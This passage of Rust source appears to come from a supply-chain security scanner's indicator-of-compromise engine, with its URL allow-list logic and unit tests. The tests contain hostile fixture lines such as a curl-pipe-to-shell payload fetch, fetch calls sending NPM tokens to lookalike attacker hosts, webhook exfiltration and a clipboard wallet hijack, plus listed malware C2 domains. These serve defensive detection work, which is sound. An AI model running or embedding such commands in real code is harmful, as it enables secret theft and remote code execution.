                "IOC_IPV4_PUBLIC",
                matched,
                Finding::new("ioc", ThreatCategory::Network, sev, conf, title, desc)
                    .with_rule_id("IOC_IPV4_PUBLIC")
                    .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                    .with_evidence(matched, 160)
            );
        }

        // ------------------------------------------------------------------
        // 4. Suspicious-TLD domains — Low/Medium Ioc (context-elevated)
        // ------------------------------------------------------------------
        for mat in p.suspicious_tld.find_iter(text) {
            let matched = mat.as_str();
            let line = line_of(text, mat.start());
            let (sev, conf) = if elevate {
                (Severity::Medium, Confidence::High)
            } else {
                (Severity::Low, Confidence::Medium)
            };
            emit_deduped!(
                "IOC_SUSPICIOUS_TLD",
                matched,
                Finding::new(
                    "ioc",
                    ThreatCategory::Ioc,
                    sev,
                    conf,
                    "Domain with suspicious TLD",
                    "A domain ending in a TLD heavily abused for malicious hosting \
(.xyz/.top/.tk/.ru/.su etc.) is referenced.",
                )
                .with_rule_id("IOC_SUSPICIOUS_TLD")
                .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                .with_evidence(matched, 160)
            );
        }

        // ------------------------------------------------------------------
        // 5. Generic URLs — Low Ioc by default, elevated in install/env-enum context.
        //    Skip URLs already covered by the exfil or suspicious-TLD passes.
        // ------------------------------------------------------------------
        for mat in p.url.find_iter(text) {
            let matched = mat.as_str();
            // Don't double-flag URLs already caught by a higher-signal pass.
            if p.exfil_endpoint.is_match(matched) {
                continue;
            }
            if p.suspicious_tld.is_match(matched) {
                continue;
            }
            // npm registry and common documentation/CDN hosts are expected in
            // virtually every package and are not actionable on their own.
            if is_benign_url(matched) {
                continue;
            }

            let line = line_of(text, mat.start());
            let (sev, cat, rule, title, desc) = if elevate {
                (
                    Severity::Medium,
                    ThreatCategory::Exfiltration,
                    "IOC_URL_INSTALL_SCRIPT",
                    "URL in install/env-enumeration context",
                    "A URL appears in an install lifecycle script or alongside \
environment variable enumeration. This is a vector for exfiltration and \
remote-payload fetch.",
                )
            } else {
                (
                    Severity::Low,
                    ThreatCategory::Ioc,
                    "IOC_URL",
                    "Hardcoded URL",
                    "A hardcoded URL was found. Alone this is informational; \
combined with other findings it can indicate network activity.",
                )
            };
            emit_deduped!(
                rule,
                matched,
                Finding::new("ioc", cat, sev, Confidence::Low, title, desc)
                    .with_rule_id(rule)
                    .with_location(FileLocation::at_line(file.rel_path.clone(), line))
                    .with_evidence(matched, 160)
            );
        }

        trace!(
            engine = "ioc",
            file = %file.rel_path,
            findings = local.len(),
            "ioc scan complete"
        );

        out.extend(local);
    }
}

// ---------------------------------------------------------------------------
// Benign-URL allow-list
// ---------------------------------------------------------------------------

/// True when `url` begins with `prefix` AND the character that follows the
/// prefix is a host/path delimiter (`/ ? # :`) or the string ends there.
///
/// A plain `starts_with` is a domain-confusion hole: `https://github.com`
/// would "match" `https://github.com.evil-c2.ru/steal?d=SECRET`, letting an
/// attacker exfiltrate to any host that merely has a trusted domain as a label
/// prefix. Requiring a delimiter anchors the match at the host boundary so
/// `github.com.evil.ru` is NOT treated as `github.com`.
fn benign_prefix_match(lower: &str, prefix: &str) -> bool {
    if !lower.starts_with(prefix) {
        return false;
    }
    match lower.as_bytes().get(prefix.len()) {
        None => true, // exact match
        Some(&b) => matches!(b, b'/' | b'?' | b'#' | b':'),
    }
}

/// Returns true for URLs that are almost always benign in an npm package and
/// should not generate a finding on their own.
fn is_benign_url(url: &str) -> bool {
    let lower = url.to_lowercase();
    // npm registry and package pages.
    if benign_prefix_match(&lower, "https://registry.npmjs.org")
        || benign_prefix_match(&lower, "https://www.npmjs.com")
    {
        return true;
    }
    // GitHub source references, CI, API docs, raw content.
    if benign_prefix_match(&lower, "https://github.com")
        || benign_prefix_match(&lower, "https://raw.githubusercontent.com")
        || benign_prefix_match(&lower, "https://api.github.com")
    {
        return true;
    }
    // Common CDNs, documentation, and standards bodies.
    const BENIGN_PREFIXES: &[&str] = &[
        "https://cdn.jsdelivr.net",
        "https://unpkg.com",
        "https://cdnjs.cloudflare.com",
        "https://docs.rs",
        "https://crates.io",
        "https://pypi.org",
        "https://www.w3.org",
        "https://schema.org",
        "https://opensource.org/licenses",
        "https://creativecommons.org",
        "https://spdx.org",
        "http://json-schema.org",
        "https://json-schema.org",
        "https://eslint.org",
        "https://babeljs.io",
        "https://webpack.js.org",
        "https://rollupjs.org",
        "https://vitejs.dev",
        "https://www.typescriptlang.org",
        "https://nodejs.org",
        "https://developer.mozilla.org",
        "https://tc39.es",
        "https://262.ecma-international.org",
        // FP2: sponsorship / funding URLs — harmless in package metadata
        // and README files; flagging these creates noise with no security value.
        "https://opencollective.com",
        "https://sponsors.github.com",
        "https://liberapay.com",
        "https://patreon.com",
        "https://www.patreon.com",
    ];
    for prefix in BENIGN_PREFIXES {
        if benign_prefix_match(&lower, prefix) {
            return true;
        }
    }
    false
}

// ---------------------------------------------------------------------------
// Line-number helper
// ---------------------------------------------------------------------------

/// Returns the 1-based line number of `byte_offset` within `text`.
fn line_of(text: &str, byte_offset: usize) -> usize {
    let up_to = byte_offset.min(text.len());
    text[..up_to].bytes().filter(|&b| b == b'\n').count() + 1
}

// ---------------------------------------------------------------------------
// DetectionEngine impl
// ---------------------------------------------------------------------------

impl DetectionEngine for IocEngine {
    fn name(&self) -> &'static str {
        "ioc"
    }

    fn scan(&self, ctx: &ScanContext<'_>) -> Vec<Finding> {
        let mut findings = Vec::new();
        for file in ctx.files {
            // Binary formats and unknown blobs carry no meaningful text IOCs.
            if matches!(
                file.kind,
                FileKind::ElfBinary
                    | FileKind::PeBinary
                    | FileKind::MachoBinary
                    | FileKind::Wasm
                    | FileKind::Archive
                    | FileKind::Unknown
            ) {
                continue;
            }
            self.scan_file(file, &mut findings);
        }
        findings
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ScanConfig;
    use crate::engine::{FileKind, FileUnit, ScanContext};
    use crate::types::ThreatCategory;

    fn make_file(path: &str, content: &str, kind: FileKind) -> FileUnit {
        FileUnit {
            rel_path: path.to_owned(),
            sha256: String::new(),
            kind,
            data: content.as_bytes().to_vec(),
        }
    }

    fn scan_single(path: &str, content: &str, kind: FileKind) -> Vec<Finding> {
        let file = make_file(path, content, kind);
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: path.to_owned(),
            files: std::slice::from_ref(&file),
            package_json: None,
            config: &config,
        };
        IocEngine.scan(&ctx)
    }

    // -----------------------------------------------------------------------
    // Positive cases — existing rules
    // -----------------------------------------------------------------------

    #[test]
    fn discord_webhook_is_high_exfiltration() {
        let content = "const HOOK = 'https://discord.com/api/webhooks/1234567890/abcdefghijklmnop';\nfetch(HOOK, { method: 'POST', body: JSON.stringify({ content: data }) });";
        let findings = scan_single("scripts/postinstall.js", content, FileKind::Javascript);
        assert!(
            !findings.is_empty(),
            "expected at least one finding for discord webhook"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT"))
            .expect("expected IOC_EXFIL_ENDPOINT finding");
        assert_eq!(f.severity, Severity::High, "discord webhook must be High");
        assert_eq!(
            f.category,
            ThreatCategory::Exfiltration,
            "must be Exfiltration"
        );
    }

    #[test]
    fn discordapp_webhook_variant_detected() {
        let content = "var u='https://discordapp.com/api/webhooks/987654321/XXXXXXXXXXXXXXXXXXX';";
        let findings = scan_single("install.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT")),
            "discordapp.com webhook variant must be detected"
        );
    }

    #[test]
    fn telegram_bot_endpoint_detected() {
        let content = "fetch('https://api.telegram.org/bot123456789:ABCdefGHIjklMNOpqrSTUvwxYZ12345678/sendMessage')";
        let findings = scan_single("src/exfil.js", content, FileKind::Javascript);
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT"))
            .expect("telegram bot endpoint must be detected");
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.category, ThreatCategory::Exfiltration);
    }

    #[test]
    fn pastebin_raw_is_exfil() {
        let content = "var p = 'https://pastebin.com/raw/aBcDeF12';";
        let findings = scan_single("src/loader.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT")),
            "pastebin raw must be flagged as exfil endpoint"
        );
    }

    #[test]
    fn ngrok_endpoint_detected() {
        let content = "const base = 'https://abc123.ngrok.io/collect';";
        let findings = scan_single("src/upload.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT")),
            "ngrok.io URL must be detected"
        );
    }

    #[test]
    fn interactsh_oast_detected() {
        let content = "fetch('https://xyz.oast.fun/probe')";
        let findings = scan_single("src/probe.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT")),
            "oast.fun endpoint must be detected"
        );
    }

    #[test]
    fn eth_address_is_crypto_stealer() {
        let content =
            "const wallet = '0xDeAdBeEf00000000000000000000000000000001';\nsendFunds(wallet);";
        let findings = scan_single("src/transfer.js", content, FileKind::Javascript);
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_WALLET_ETH"))
            .expect("expected IOC_WALLET_ETH finding");
        assert_eq!(
            f.category,
            ThreatCategory::CryptoStealer,
            "ETH address must be CryptoStealer"
        );
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.confidence, Confidence::High);
    }

    #[test]
    fn btc_base58_address_detected() {
        // The genesis coinbase address — well-known, 34 chars.
        let content = "send to 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf'\n";
        let findings = scan_single("payload.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_WALLET_BTC")),
            "BTC base58 address must be detected"
        );
    }

    #[test]
    fn btc_bech32_address_detected() {
        let content = "wallet_addr = 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'";
        let findings = scan_single("stealer.py", content, FileKind::Python);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_WALLET_BTC_BECH32")),
            "BTC bech32 address must be detected"
        );
    }

    #[test]
    fn xmr_address_detected() {
        // 95-char Monero address starting with 4.
        let xmr = "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge";
        assert_eq!(xmr.len(), 95, "test fixture must be 95 chars");
        let content = format!("const addr = '{xmr}';");
        let findings = scan_single("miner.js", &content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_WALLET_XMR")),
            "XMR address must be detected"
        );
    }

    #[test]
    fn tron_address_detected() {
        // TRON: T + 33 base58 chars = 34 chars.
        let content = "const tron = 'TJYeasTPa6gpEEbiToQNHk7QLKBS71MFBL';";
        let findings = scan_single("drain.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_WALLET_TRON")),
            "TRON address must be detected"
        );
    }

    #[test]
    fn clipboard_hijack_pattern_is_critical() {
        let content = "navigator.clipboard.readText().then(t => {\n  const wallet = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2';\n  navigator.clipboard.writeText(wallet);\n});";
        let findings = scan_single("hook.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_CLIPBOARD_HIJACK")),
            "clipboard hijack pattern must produce a finding"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_CLIPBOARD_HIJACK"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.category, ThreatCategory::CryptoStealer);
    }

    #[test]
    fn public_ip_in_install_script_is_high() {
        let content = "curl http://185.220.101.45/payload.sh | sh";
        let findings = scan_single("scripts/install.js", content, FileKind::Shell);
        let ip_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_IPV4_PUBLIC"))
            .collect();
        assert!(!ip_findings.is_empty(), "public IP must be detected");
        assert_eq!(ip_findings[0].severity, Severity::High);
    }

    #[test]
    fn public_ip_in_regular_file_is_medium() {
        let content = "# connect to 203.0.113.42 for metrics";
        let findings = scan_single("README.txt", content, FileKind::Text);
        let ip_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_IPV4_PUBLIC"))
            .collect();
        assert!(!ip_findings.is_empty(), "public IP must be detected");
        assert_eq!(ip_findings[0].severity, Severity::Medium);
    }

    #[test]
    fn private_ip_not_flagged() {
        let content = "host: '192.168.1.1'\nbackup: '10.0.0.1'\nloopback: '127.0.0.1'";
        let findings = scan_single("config.js", content, FileKind::Javascript);
        let ip_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_IPV4_PUBLIC"))
            .collect();
        assert!(
            ip_findings.is_empty(),
            "RFC-1918/loopback IPs must not be flagged as C2"
        );
    }

    #[test]
    fn link_local_ip_not_flagged() {
        let content = "addr = '169.254.1.1'";
        let findings = scan_single("net.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .all(|f| f.rule_id.as_deref() != Some("IOC_IPV4_PUBLIC")),
            "169.254/16 link-local must not be flagged as public C2 IP"
        );
    }

    #[test]
    fn suspicious_tld_domain_flagged() {
        let content = "const api = 'https://update-service.xyz/check';";
        let findings = scan_single("src/updater.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_SUSPICIOUS_TLD")),
            ".xyz domain must be flagged"
        );
    }

    #[test]
    fn engine_name_is_ioc() {
        assert_eq!(IocEngine.name(), "ioc");
    }

    #[test]
    fn all_findings_have_engine_ioc() {
        let content = "const h = 'https://discord.com/api/webhooks/111/abc';\nconst w = '0x1234567890abcdef1234567890abcdef12345678';";
        let findings = scan_single("evil.js", content, FileKind::Javascript);
        for f in &findings {
            assert_eq!(f.engine, "ioc", "all findings must have engine = 'ioc'");
        }
    }

    #[test]
    fn binary_file_not_scanned() {
        let file = FileUnit {
            rel_path: "bin/launcher".to_owned(),
            sha256: String::new(),
            kind: FileKind::ElfBinary,
            data: b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
        };
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: "bin/launcher".to_owned(),
            files: std::slice::from_ref(&file),
            package_json: None,
            config: &config,
        };
        let findings = IocEngine.scan(&ctx);
        assert!(
            findings.is_empty(),
            "ELF binary must not produce IOC findings"
        );
    }

    // Evasion regression: a script-kind file with an injected NUL byte in the
    // first 8 KiB must STILL be scanned for IOCs. Previously `looks_textual()`
    // flipped to false on any NUL, letting an attacker prepend one NUL to make
    // the IOC (and every other text) engine skip the file entirely.
    #[test]
    fn nul_byte_does_not_evade_ioc_scan() {
        // Malicious: a lone NUL in a JS comment plus a real exfil endpoint.
        let mut data = b"/*\x00*/ fetch('https://discord.com/api/webhooks/111/abcdefgh');".to_vec();
        let file = FileUnit {
            rel_path: "scripts/postinstall.js".to_owned(),
            sha256: String::new(),
            kind: FileKind::Javascript,
            data: data.clone(),
        };
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: file.rel_path.clone(),
            files: std::slice::from_ref(&file),
            package_json: None,
            config: &config,
        };
        let findings = IocEngine.scan(&ctx);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT")),
            "NUL-prefixed script must not evade IOC exfil detection: {findings:?}"
        );

        // True-negative: a genuine dense binary blob is still not IOC-scanned.
        data = vec![0u8; 512];
        data.extend_from_slice(b"https://discord.com/api/webhooks/111/abcdefgh");
        let bin = FileUnit {
            rel_path: "blob.bin".to_owned(),
            sha256: String::new(),
            kind: FileKind::Unknown,
            data,
        };
        let ctx2 = ScanContext {
            target_name: bin.rel_path.clone(),
            files: std::slice::from_ref(&bin),
            package_json: None,
            config: &config,
        };
        assert!(
            IocEngine.scan(&ctx2).is_empty(),
            "dense binary blob must not be IOC-scanned"
        );
    }

    // Domain-confusion regression: a trusted domain used as a LABEL PREFIX of
    // an attacker host must NOT be treated as benign.
    #[test]
    fn trusted_domain_as_prefix_of_attacker_host_not_benign() {
        // Malicious: exfil to raw.githubusercontent.com.<attacker>.
        assert!(!is_benign_url(
            "https://raw.githubusercontent.com.evil-c2.ru/steal?d=secret"
        ));
        assert!(!is_benign_url("https://github.com.attacker.ru/payload"));
        assert!(!is_benign_url("https://npmjs.com.evil.link/x"));
        // True-negative: the genuine hosts (and their real paths) stay benign.
        assert!(is_benign_url("https://github.com"));
        assert!(is_benign_url("https://github.com/owner/repo"));
        assert!(is_benign_url(
            "https://raw.githubusercontent.com/o/r/main/x.js"
        ));
        assert!(is_benign_url(
            "https://registry.npmjs.org/foo/-/foo-1.0.0.tgz"
        ));
        assert!(is_benign_url("https://opensource.org/licenses/MIT"));
    }

    // The confusion host must actually surface as an IOC finding (not silently
    // suppressed as benign) when it appears in a scanned file.
    #[test]
    fn exfil_to_confusion_host_produces_finding() {
        let content =
            "fetch('https://api.github.com.evil.ru/collect?token='+process.env.NPM_TOKEN)";
        let findings = scan_single("src/beacon.js", content, FileKind::Javascript);
        assert!(
            findings.iter().any(|f| matches!(
                f.rule_id.as_deref(),
                Some("IOC_URL") | Some("IOC_SUSPICIOUS_TLD")
            )),
            "confusion host must produce a URL/IOC finding: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // Negative cases — benign input must not false-positive
    // -----------------------------------------------------------------------

    #[test]
    fn npm_registry_url_not_high() {
        // npm registry URL appears in every package-lock.json.
        let content = r#"{ "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz" }"#;
        let findings = scan_single("package-lock.json", content, FileKind::Json);
        let concerning: Vec<_> = findings
            .iter()
            .filter(|f| f.severity >= Severity::High || f.category == ThreatCategory::Exfiltration)
            .collect();
        assert!(
            concerning.is_empty(),
            "npm registry URL must not produce High/Exfil findings: {concerning:?}"
        );
    }

    #[test]
    fn github_url_not_high() {
        let content = "See the README at https://github.com/user/repo";
        let findings = scan_single("README.txt", content, FileKind::Text);
        let high: Vec<_> = findings
            .iter()
            .filter(|f| f.severity >= Severity::High)
            .collect();
        assert!(
            high.is_empty(),
            "GitHub URL must not produce High+ findings: {high:?}"
        );
    }

    #[test]
    fn eth_zero_address_not_flagged() {
        let content = "const ZERO = '0x0000000000000000000000000000000000000000';";
        let findings = scan_single("constants.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .all(|f| f.rule_id.as_deref() != Some("IOC_WALLET_ETH")),
            "Ethereum zero address must not be flagged"
        );
    }

    #[test]
    fn dedup_same_ioc_emitted_once() {
        let hook = "https://discord.com/api/webhooks/99999/TOKENTOKENTOKEN";
        let content = format!("{hook}\n{hook}\n{hook}");
        let findings = scan_single("dup.js", &content, FileKind::Javascript);
        let count = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT"))
            .count();
        assert_eq!(
            count, 1,
            "identical IOCs must be deduplicated to one finding"
        );
    }

    #[test]
    fn max_findings_per_file_respected() {
        // Generate 100 distinct ETH addresses.
        let mut content = String::new();
        for i in 1u64..=100 {
            content.push_str(&format!("const w{i} = '0x{i:040x}';\n"));
        }
        let findings = scan_single("many_wallets.js", &content, FileKind::Javascript);
        assert!(
            findings.len() <= MAX_FINDINGS_PER_FILE,
            "findings per file must be capped at {MAX_FINDINGS_PER_FILE}, got {}",
            findings.len()
        );
    }

    #[test]
    fn line_of_helper_correct() {
        let text = "line1\nline2\nline3";
        assert_eq!(line_of(text, 0), 1);
        assert_eq!(line_of(text, 6), 2);
        assert_eq!(line_of(text, 12), 3);
    }

    #[test]
    fn url_in_postinstall_is_medium_exfil() {
        let content = "fetch('https://totally-legit-server.com/report', { body: secret })";
        let findings = scan_single("scripts/postinstall.js", content, FileKind::Javascript);
        let url_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_URL_INSTALL_SCRIPT"))
            .collect();
        assert!(
            !url_findings.is_empty(),
            "URL in postinstall must be flagged as IOC_URL_INSTALL_SCRIPT"
        );
        assert_eq!(url_findings[0].severity, Severity::Medium);
        assert_eq!(url_findings[0].category, ThreatCategory::Exfiltration);
    }

    #[test]
    fn wasm_file_not_scanned() {
        let file = FileUnit {
            rel_path: "pkg/module.wasm".to_owned(),
            sha256: String::new(),
            kind: FileKind::Wasm,
            // WASM magic header
            data: b"\x00asm\x01\x00\x00\x00".to_vec(),
        };
        let config = ScanConfig::default();
        let ctx = ScanContext {
            target_name: "module.wasm".to_owned(),
            files: std::slice::from_ref(&file),
            package_json: None,
            config: &config,
        };
        assert!(
            IocEngine.scan(&ctx).is_empty(),
            "WASM must not produce IOC findings"
        );
    }

    #[test]
    fn evidence_is_truncated() {
        // A very long URL should produce truncated evidence.
        let long_url = format!("https://evil.xyz/{}", "a".repeat(500));
        let content = format!("fetch('{long_url}')");
        let findings = scan_single("index.js", &content, FileKind::Javascript);
        for f in &findings {
            if let Some(ev) = &f.evidence {
                assert!(
                    ev.len() <= 165,
                    "evidence must be truncated to ≤160 chars + ellipsis"
                );
            }
        }
    }

    // -----------------------------------------------------------------------
    // IOC-01..IOC-12 positive cases
    // -----------------------------------------------------------------------

    #[test]
    fn ioc01_icp_canister_endpoint_detected() {
        // CanisterWorm canister URL from Section 3.1
        let content = "const c2 = 'https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/cmd';";
        let findings = scan_single("postinstall.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_ICP_CANISTER")),
            "ICP canister icp0.io URL must be detected (IOC-01)"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_ICP_CANISTER"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.category, ThreatCategory::Network);
    }

    #[test]
    fn ioc01_ic0_app_variant_detected() {
        let content = "fetch('https://some-canister-id.ic0.app/exec')";
        let findings = scan_single("index.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_ICP_CANISTER")),
            "ICP canister ic0.app URL must be detected (IOC-01)"
        );
    }

    #[test]
    fn ioc02_worm_webhook_uuid_detected() {
        // Shai-Hulud v1 / s1ngularity shared UUID
        let content = "const hook = 'https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7';";
        let findings = scan_single("install.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_WEBHOOK_SITE_WORM")),
            "Known worm webhook.site UUID must be detected as Critical (IOC-02)"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_WEBHOOK_SITE_WORM"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn ioc02_ectoplasm_webhook_uuid_detected() {
        let content = "url: 'https://webhook.site/602a4c72-7033-4e28-92ea-dc66e59206e5'";
        let findings = scan_single("payload.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_WEBHOOK_SITE_WORM")),
            "Ectoplasm webhook.site UUID must be detected (IOC-02)"
        );
    }

    #[test]
    fn ioc03_sandworm_domains_detected() {
        for domain in &[
            "t.m-kosche.com",
            "official334.workers.dev",
            "freefan.net",
            "fanfree.net",
        ] {
            let content = format!("fetch('https://{domain}/beacon')");
            let findings = scan_single("src/telemetry.js", &content, FileKind::Javascript);
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id.as_deref() == Some("IOC_SANDWORM_DOMAINS")),
                "SANDWORM domain {domain} must be detected (IOC-03)"
            );
            let f = findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("IOC_SANDWORM_DOMAINS"))
                .unwrap();
            assert_eq!(f.severity, Severity::Critical);
        }
    }

    #[test]
    fn ioc04_canisterworm_domains_detected() {
        for domain in &["scan.aquasecurtiy.org", "hackmoltrepeat.com"] {
            let content = format!("curl https://{domain}/trivy");
            let findings = scan_single("postinstall.sh", &content, FileKind::Shell);
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id.as_deref() == Some("IOC_CANISTERWORM_DOMAINS")),
                "CanisterWorm domain {domain} must be detected (IOC-04)"
            );
        }
    }

    #[test]
    fn ioc05_hardcoded_telegram_token_detected() {
        // Long-form bot token (8+ digit id : 35+ char secret)
        let content = "const BOT = 'https://api.telegram.org/bot12345678901:ABCDefGHIJKLMNOPQRSTUVWXYZ1234567890ab/send';";
        let findings = scan_single("exfil.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_HARDCODED_SMTP_TELEGRAM")),
            "Hardcoded Telegram bot token must be detected (IOC-05)"
        );
    }

    #[test]
    fn ioc05_mailtrap_smtp_detected() {
        let content = "host: 'sandbox.smtp.mailtrap.io', port: 2525, user: 'abc', pass: 'xyz'";
        let findings = scan_single("mailer.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_HARDCODED_SMTP_TELEGRAM")),
            "Mailtrap SMTP credential must be detected (IOC-05)"
        );
    }

    #[test]
    fn ioc06_bunnycdn_exfil_detected() {
        let content = "const cdn = 'https://static-mw-host.b-cdn.net/collect';";
        let findings = scan_single("heist.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_BUNNYCDN_EXFIL")),
            "BunnyCDN exfil subdomain must be detected (IOC-06)"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_BUNNYCDN_EXFIL"))
            .unwrap();
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn ioc07_scavenger_rat_c2_detected() {
        for domain in &["datahog.su", "datacrab-analytics.com", "dieorsuffer.com"] {
            let content = format!("https.get('https://{domain}/rat')");
            let findings = scan_single("scripts/install.js", &content, FileKind::Javascript);
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id.as_deref() == Some("IOC_SCAVENGER_RAT_C2")),
                "Scavenger RAT domain {domain} must be detected (IOC-07)"
            );
            let f = findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("IOC_SCAVENGER_RAT_C2"))
                .unwrap();
            assert_eq!(f.severity, Severity::Critical);
        }
    }

    #[test]
    fn ioc08_lazarus_beavertail_ip_detected() {
        // Known Lazarus C2 IP — also caught by ipv4_public but IOC_LAZARUS_BEAVERTAIL
        // fires at Critical with High confidence.
        let content = "fetch('http://172.86.84.38:1224/pdown')";
        let findings = scan_single("src/loader.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_LAZARUS_BEAVERTAIL")),
            "Lazarus BeaverTail C2 IP must be detected (IOC-08)"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_LAZARUS_BEAVERTAIL"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn ioc08_lazarus_fake_telemetry_detected() {
        let content = "fetch('https://process-log.vercel.app/api/ipcheck?t=' + token)";
        let findings = scan_single("index.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_LAZARUS_BEAVERTAIL")),
            "Lazarus fake telemetry endpoint must be detected (IOC-08)"
        );
    }

    #[test]
    fn ioc09_covert_pixel_exfil_detected() {
        let content = "new Image().src = 'https://sstatic1.histats.com/0.gif?referer=' + token;";
        let findings = scan_single("src/analytics.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_COVERT_PIXEL_EXFIL")),
            "Analytics pixel exfil domain must be detected (IOC-09)"
        );
    }

    #[test]
    fn ioc10_node_ipc_dns_domain_detected() {
        let content = "const dns_target = 'azurestaticprovider.net';";
        let findings = scan_single("dns.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_NODE_IPC_2026_DNS")),
            "node-ipc 2026 DNS C2 domain must be detected (IOC-10)"
        );
    }

    #[test]
    fn ioc10_node_ipc_hmac_key_detected() {
        let content = r#"const KEY = 'qZ8pL3vNxR9wKmTyHbVcFgDsJaEoUi';"#;
        let findings = scan_single("stealth.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_NODE_IPC_2026_DNS")),
            "node-ipc 2026 HMAC key literal must be detected (IOC-10)"
        );
    }

    #[test]
    fn ioc11_canistersprawl_secondary_exfil_detected() {
        let content = "fetch('https://telemetry.api-monitor.com/collect', { body: data })";
        let findings = scan_single("pth_payload.py", content, FileKind::Python);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_CANISTERSPRAWL")),
            "CanisterSprawl secondary exfil domain must be detected (IOC-11)"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_CANISTERSPRAWL"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn ioc11_canistersprawl_canister_url_detected() {
